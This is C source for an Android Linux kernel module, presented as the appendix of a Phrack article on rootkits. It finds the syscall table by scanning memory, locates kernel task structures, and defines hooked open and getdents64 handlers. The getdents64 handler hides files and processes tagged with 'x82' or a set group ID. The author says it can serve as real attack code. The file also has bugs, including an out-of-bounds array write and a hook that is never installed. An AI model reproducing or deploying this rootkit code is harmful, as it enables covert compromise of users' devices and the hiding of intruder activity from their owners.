/*
**
** This is appendix of the Phrack (www.phrack.org) article:
** Android platform based linux kernel rootkit
** sys_call_table hooking code
**
** All the tests were done on Motoroi XT720 model(2.6.29-omap1 kernel)
** and Galaxy S SHW-M110S model(2.6.32.9 kernel).
** Note that some contents may not apply to all smart platform machines
** and there are some bugs you can modify.
**
** This code can be used as a real code for attack or just a proof-of-
** concept code. I wish you use this code only for your study not for a bad 
** purpose.
**
** USE IT AT YOUR OWN RISK!
**
** --
** by "dong-hoon you" (Xpl017Elz), <x82@inetcop.org>
** My World: http://x82.inetcop.org
**
*/

#include <linux/init_task.h> 
#include <linux/kernel.h> 
#include <linux/module.h> 
#include <linux/sched.h> 
#include <linux/unistd.h> 
#include <linux/dirent.h>

#include <asm/unistd.h> 

#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/proc_fs.h>
#include <asm/uaccess.h>
#include <linux/namei.h>


#define __NR_GETDENTS64 217
#define __NR_OPEN 5


#define DEF_GID 18282
#define DEF_HIDE "x82"

static void **sys_call_table;
int comm_offset=0;
int cred_offset=0;
int pid_offset=0;
int parent_offset=0;
int next_offset=0;
int start_chk=0;

struct cred_struct {
	int usage;
	int uid;	/* real UID of the task */
	int gid;	/* real GID of the task */
	int suid;	/* saved UID of the task */
	int sgid;	/* saved GID of the task */
	int euid;	/* effective UID of the task */
	int egid;	/* effective GID of the task */
	int fsuid;	/* UID for VFS ops */
	int fsgid;	/* GID for VFS ops */
};


asmlinkage int (*orig_getdents64)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);

asmlinkage int (*orig_open)(const char *pathname,int flags, mode_t mode);

void get_sys_call_table(){
	void *swi_addr=(long *)0xffff0008;
	unsigned long offset=0;
	unsigned long *vector_swi_addr=0;

	offset=((*(long *)swi_addr)&0xfff)+8;
	vector_swi_addr=*(unsigned long *)(swi_addr+offset);

	while(vector_swi_addr++){
		if(((*(unsigned long *)vector_swi_addr)&0xfffff000)==0xe28f8000){
			offset=((*(unsigned long *)vector_swi_addr)&0xfff)+8;
			sys_call_table=(void *)vector_swi_addr+offset;
			break;
		}
	}
	return;
}

void find_offset(){
	unsigned char *init_task_ptr=(char *)&init_task;
	int offset=0,i;
	char *ptr=0;

	/* getting the position of comm offset within task_struct structure */
	for(i=0;i<0x600;i++){
		if(init_task_ptr[i]=='s'&&init_task_ptr[i+1]=='w'&&init_task_ptr[i+2]=='a'&&
		init_task_ptr[i+3]=='p'&&init_task_ptr[i+4]=='p'&&init_task_ptr[i+5]=='e'&&
		init_task_ptr[i+6]=='r'){
			comm_offset=i;
			break;
		}
	}
	/* getting the position of tasks.next offset within task_struct structure */
	init_task_ptr+=0x50;
	for(i=0x50;i<0x300;i+=4,init_task_ptr+=4){
		offset=*(long *)init_task_ptr;
		if(offset&&offset>0xc0000000){
			offset-=i;
			offset+=comm_offset;
			if(strcmp((char *)offset,"init")){
				continue;
			} else {
				next_offset=i;
				/* getting the position of parent offset 
				   within task_struct structure */
				for(;i<0x300;i+=4,init_task_ptr+=4){
					offset=*(long *)init_task_ptr;
					if(offset&&offset>0xc0000000){
						offset+=comm_offset;
						if(strcmp((char *)offset,"swapper")){
							continue;
						} else {
							parent_offset=i+4;
							break;
						}
					}
				}
				break;
			}
		}
	}
	/* getting the position of cred offset within task_struct structure */
	init_task_ptr=(char *)&init_task;
	init_task_ptr+=comm_offset;
	for(i=0;i<0x50;i+=4,init_task_ptr-=4){
		offset=*(long *)init_task_ptr;
		if(offset&&offset>0xc0000000&&offset<0xd0000000&&offset==*(long *)(init_task_ptr-4)){
			ptr=(char *)offset;
			if(*(long *)&ptr[4]==0&&*(long *)&ptr[8]==0&&
				*(long *)&ptr[12]==0&&*(long *)&ptr[16]==0&&
				*(long *)&ptr[20]==0&&*(long *)&ptr[24]==0&&
				*(long *)&ptr[28]==0&&*(long *)&ptr[32]==0){
				cred_offset=i;
				break;
			}
		}
	}
	/* getting the position of pid offset within task_struct structure */
	pid_offset=parent_offset-0xc;
	return;
}

bool checkInode(char *pathname, char *bad_file){

        int error;
        /*struct nameidata nd,nd_t;*/
        struct inode *inode,*inode_t;
	struct path path, path_t;
        mm_segment_t fs;

        error=user_path(pathname,&path);
//	printk(KERN_DEBUG "checkInode: error %d\n", error);

        if(!error){

                /*inode=nd.dentry->d_inode;*/
		/* path.dentry.d_inode */
		inode = path.dentry->d_inode;
//		printk(KERN_DEBUG "checkInode: path.dentry->d_inode %d\n", inode);
                /*Have to do this before calling user_path_walk( ) from kernel space:*/
                fs=get_fs();
                set_fs(get_ds( ));

                /*Protect /tmp/test. Change this to whatever file you want to protect*/
                /*error=user_path_walk(bad_file,&nd_t);*/
		error=user_path(bad_file,&path_t);
                set_fs(fs);
                if(!error){
                        /*inode_t=nd_t.dentry->d_inode;*/
			inode_t = path_t.dentry->d_inode;
//			printk(KERN_DEBUG "checkInode: path_t.dentry->d_inode %d\n", inode_t);
                        if(inode==inode_t)
                                return true;
                }
        }
  
        return false;


}


asmlinkage int hacked_open(const char *pathname,int flags, mode_t mode){

//	printk(KERN_DEBUG "hacked_open: %s", pathname );
/*
TODO: pass in the bad_files and whitelist root apps from a userland app...
TODO: it might be better to get all of the bad file inode's in the module init
so that we dont have to retrieve multiple inode values per sys_open call
*/	
	char *ptr=(char *)current;
	char *comm=ptr+comm_offset;
	unsigned long cred_ptr=*(int *)(comm-cred_offset);
	struct cred_struct *cred=(struct cred_struct *)cred_ptr;

	char* bad_files[4];
	bad_files[0] = "/data/local/tmp/test0";
	bad_files[1] = "/data/local/tmp/test1";
	bad_files[2] = "/data/local/tmp/test2";
	bad_files[3] = "/data/local/tmp/test3";
	bad_files[4] = "/data/local/tmp/test4";

	int i = 0;
	for(i; i < 5; i++){
		if ( cred->uid != 0 ){	
			if ( checkInode(pathname, bad_files[i])){
				printk(KERN_DEBUG "hacked_open BAD FILE MATCH: procname=%s, file=%s\n", comm, pathname );
				return -EACCES;
			}
		}
	}

	return (*orig_open)(pathname, flags, mode);
}


/* enyelkm-1.2 rootkit's example */
asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count){
	struct linux_dirent64 *td1,*td2;
	long ret,tmp;
	unsigned long hpid;
	int mover,process;

	ret=(*orig_getdents64)(fd,dirp,count);
	if(!ret) return ret;

	td2=(struct linux_dirent64 *)kmalloc(ret,GFP_KERNEL);
	copy_from_user(td2,dirp,ret);

	td1=td2;
	tmp=ret;

	while(tmp>0){
		tmp-=td1->d_reclen;
		mover=1;
		process=0;
		hpid=0;

		hpid=simple_strtoul(td1->d_name,NULL,10);
		if(hpid!=0){
			char *init_task_ptr=(char *)&init_task;
			char *comm=init_task_ptr+comm_offset;
			unsigned long cred_ptr=*(int *)(comm-cred_offset);
			struct cred_struct *cred=(struct cred_struct *)cred_ptr;
			int pid_v=*(int *)(init_task_ptr+pid_offset);
			char *next_ptr=(char *)(*(long *)(init_task_ptr+next_offset))-next_offset;

			do{
				comm=next_ptr+comm_offset;
				pid_v=*(int *)(next_ptr+pid_offset);
				cred_ptr=*(int *)(comm-cred_offset);
				cred=(struct cred_struct *)cred_ptr;
				if(pid_v==hpid){
					if(cred->gid==DEF_GID||strstr(comm,DEF_HIDE)){
						process=1;
					}
					break;
				}
			} while ((next_ptr=(char *)(*(long *)(next_ptr+next_offset))-next_offset)!=init_task_ptr);
		}

		if(process||strstr(td1->d_name,DEF_HIDE)){
			ret-=td1->d_reclen;
			mover=0;
			if(tmp){
				memmove(td1,(char *)td1+td1->d_reclen,tmp);
			}
		}
		if(tmp&&mover){
			td1=(struct linux_dirent64 *)((char *)td1+td1->d_reclen);
		}
	}
	copy_to_user((void *)dirp,(void *)td2,ret);
	kfree(td2);

	return ret;
}

int start_module(void) 
{
	printk(KERN_DEBUG  "Hello world!\n");

	find_offset();
	get_sys_call_table();
	orig_open = sys_call_table[__NR_OPEN];
//	orig_getdents64 = sys_call_table[__NR_GETDENTS64];
	return 0; 
}

void stop_module(void) 
{ 
	printk(KERN_DEBUG  "Bye, cruel world\n");
	return;
}

module_init(start_module);
module_exit(stop_module); 
MODULE_LICENSE("GPL");
/* eoc */
 
